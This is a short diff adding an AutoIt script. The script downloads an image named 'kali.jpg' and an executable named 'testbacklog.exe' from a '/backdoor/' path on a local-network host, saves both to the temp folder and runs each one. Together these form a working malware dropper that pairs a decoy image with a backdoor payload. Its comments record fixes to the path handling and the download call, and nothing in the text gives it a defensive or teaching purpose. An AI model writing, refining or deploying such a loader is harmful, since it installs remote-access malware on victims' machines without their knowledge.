@@ -1,0 +1,30 @@
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = _
+"http://192.168.68.109/backdoor/kali.jpg," & _
+"http://192.168.68.109/backdoor/testbacklog.exe"
+
+Local $urlsArray = StringSplit($urls, ",", 2)
+
+For $url In $urlsArray
+    Local $sFile = _DownloadFile($url)
+    If FileExists($sFile) Then
+        ShellExecute($sFile)
+    EndIf
+Next
+
+Func _DownloadFile($sURL)
+    Local $sFile, $sDirectory
+
+    ; Extract filename
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+
+    ; FIXED path (added backslash)
+    $sDirectory = @TempDir & "\" & $sFile
+
+    ; FIXED sync download
+    InetGet($sURL, $sDirectory, 17, 0)
+
+    Return $sDirectory
+EndFunc
